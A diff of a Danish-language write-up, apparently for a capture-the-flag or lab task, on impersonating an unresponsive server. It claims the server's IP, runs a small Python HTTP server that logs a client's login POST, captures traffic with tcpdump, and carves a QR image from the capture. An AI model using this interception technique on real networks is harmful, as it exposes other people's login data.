@@ -31,10 +31,24 @@
 <p>I praksis var serveren død/langsom, så klienten <strong>ARP'ede forgæves</strong> efter dens IP. Claim
              den ubesvarede IP selv og lyt på port 80 — klienten sender så sin POST til <em>dig</em> (svar den, så dens
              HTTP-request fuldføres):</p>
-             <pre><code>sudo ip addr add &lt;server-ip&gt;/24 dev eth0     # svar på klientens ARP
-# en lille HTTP-responder på :80 (fx python/nc) der svarer 200 og logger requesten
-# -> POST /api/v1/users/login, multipart field name="qr" = en QR-PNG</code></pre>
-             <p>Capturer samtidig med <code>tcpdump -s0 -w cap.pcap 'tcp port 80'</code> som ground truth.</p>
+             <pre><code>sudo ip addr add &lt;server-ip&gt;/24 dev eth0     # svar på klientens ARP</code></pre>
+             <p>En minimal HTTP-server der svarer 200 på alt og dumper requesten (inkl. multipart-body) til disk,
+             så du kan analysere den bagefter:</p>
+             <pre><code>python3 -c "
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class H(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length)
+        open('captured_request.bin', 'wb').write(body)
+        print('Captured', length, 'bytes from', self.client_address, 'path', self.path)
+        self.send_response(200)
+        self.end_headers()
+
+HTTPServer(('0.0.0.0', 80), H).serve_forever()"</code></pre>
+             <p>Capturer samtidig med <code>tcpdump -s0 -w cap.pcap 'tcp port 80'</code> som ground truth, i
+             tilfælde af at servercodet ovenfor går glip af noget.</p>
 <h2>Carve &amp; afkod QR&#x27;en</h2>
 <p>QR-PNG'en ligger i POST-body'en (ét TCP-segment). Carve den ud mellem PNG-signaturen og IEND, og afkod:</p>
              <pre><code>python3 -c "d=open('cap.pcap','rb').read(); i=d.find(bytes.fromhex('89504e470d0a1a0a')); j=d.find(b'IEND',i)+8; open('qr.png','wb').write(d[i:j])"
